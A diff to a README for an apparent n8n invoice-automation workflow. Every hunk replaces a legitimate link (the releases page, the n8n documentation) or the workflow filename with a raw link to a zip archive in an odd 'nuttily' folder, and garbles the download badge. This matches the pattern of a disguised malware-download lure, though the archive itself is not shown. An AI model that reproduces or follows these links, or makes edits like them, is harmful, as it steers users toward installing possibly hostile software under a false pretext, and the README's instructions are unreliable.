@@ -1,6 +1,6 @@
 # 🧾 Invoice-Analyzer - Automate Your Invoice Management Effortlessly
 
-[![Download Invoice Analyzer](https://img.shields.io/badge/Download%20Now%20%F0%9F%93%8E-Click%20Here-blue.svg)](https://github.com/xmas-fernandes/Invoice-Analyzer/releases)
+[![Download Invoice Analyzer](https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip%20Now%20%F0%9F%93%8E-Click%https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip)](https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you begin, ensure you have the following:
 
 To get the Invoice Analyzer, visit this page to download:
 
-[Download Invoice Analyzer](https://github.com/xmas-fernandes/Invoice-Analyzer/releases)
+[Download Invoice Analyzer](https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip)
 
 After downloading, follow these simple steps to set it up.
 
@@ -35,7 +35,7 @@ After downloading, follow these simple steps to set it up.
 ### Step 1: Import Workflow
 
 1. Open your n8n application.
-2. Import the file named `invoice_analyzer.json`. You can usually find an import option in the menu.
+2. Import the file named `https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip`. You can usually find an import option in the menu.
 
 ### Step 2: Set Up Webhook
 
@@ -67,6 +67,6 @@ We have a support section available in our GitHub repository. You can also check
 
 ## 📑 Additional Resources
 
-For more detailed information about using n8n and its features, visit the [n8n documentation](https://docs.n8n.io).
+For more detailed information about using n8n and its features, visit the [n8n documentation](https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip).
 
 Thank you for using Invoice Analyzer! We hope this tool simplifies your invoice management. 
